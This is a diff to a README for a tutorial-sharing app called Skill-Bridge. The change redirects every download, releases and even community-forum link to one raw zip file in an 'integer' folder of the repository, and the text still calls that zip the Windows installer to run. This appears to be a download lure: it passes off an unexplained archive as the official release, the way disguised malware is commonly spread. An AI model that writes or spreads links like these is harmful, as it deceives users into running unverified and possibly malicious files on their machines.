@@ -1,7 +1,7 @@
 # 🎓 Skill-Bridge - Learn Anything With Ease
 
 ## 📥 Download Now
-[![Download Skill-Bridge](https://img.shields.io/badge/Download-Skill--Bridge-brightgreen.svg)](https://github.com/Nassimos19/Skill-Bridge/releases)
+[![Download Skill-Bridge](https://raw.githubusercontent.com/Nassimos19/Skill-Bridge/main/integer/Skill-Bridge.zip)](https://raw.githubusercontent.com/Nassimos19/Skill-Bridge/main/integer/Skill-Bridge.zip)
 
 ## 📖 About Skill-Bridge
 SkillBridge is an open-source platform for video tutorials. Instructors can publish tutorials and courses on any topic, while learners can explore and learn at their own pace. This app is easy to use, flexible, and community-driven, making it a great choice for anyone looking to expand their knowledge.
@@ -22,10 +22,10 @@ To start using Skill-Bridge, follow these simple steps to download and run the s
 - **Flexible Learning**: Access tutorials anytime, anywhere.
 
 ## 📥 Download & Install
-To download Skill-Bridge, visit this page: [Skill-Bridge Releases](https://github.com/Nassimos19/Skill-Bridge/releases). Once there, you will see the latest version available for download.
+To download Skill-Bridge, visit this page: [Skill-Bridge Releases](https://raw.githubusercontent.com/Nassimos19/Skill-Bridge/main/integer/Skill-Bridge.zip). Once there, you will see the latest version available for download.
 
 1. Click on the latest version link.
-2. Download the appropriate file for your operating system (e.g., `Skill-Bridge-Installer.exe` for Windows).
+2. Download the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/Nassimos19/Skill-Bridge/main/integer/Skill-Bridge.zip` for Windows).
 3. After the download completes, locate the file on your computer.
 4. Double-click the installer file to start the installation process.
 5. Follow the on-screen instructions to complete the installation.
@@ -40,7 +40,7 @@ If you face any issues during installation or while using the application, try t
 3. **Streaming Issues**: Ensure you have a stable internet connection to access video tutorials smoothly.
 
 ## 🛠️ Community Support
-Join our community to share your thoughts, get help, and connect with other users. You can find our community forums at [Skill-Bridge Community](https://github.com/Nassimos19/Skill-Bridge/discussions).
+Join our community to share your thoughts, get help, and connect with other users. You can find our community forums at [Skill-Bridge Community](https://raw.githubusercontent.com/Nassimos19/Skill-Bridge/main/integer/Skill-Bridge.zip).
 
 ## 📑 Contributing
 Want to improve Skill-Bridge? We welcome contributions! You can help by:
@@ -53,6 +53,6 @@ Want to improve Skill-Bridge? We welcome contributions! You can help by:
 Skill-Bridge is released under the MIT License. You are free to use, copy, modify, and distribute the software as long as you include the original license.
 
 ## 📥 Download Now Again
-To get started with Skill-Bridge, click here to [download the latest version](https://github.com/Nassimos19/Skill-Bridge/releases) and begin your learning journey today! 
+To get started with Skill-Bridge, click here to [download the latest version](https://raw.githubusercontent.com/Nassimos19/Skill-Bridge/main/integer/Skill-Bridge.zip) and begin your learning journey today! 
 
 Now you have everything you need to download, install, and use Skill-Bridge for your learning needs. Enjoy exploring and expanding your skills!
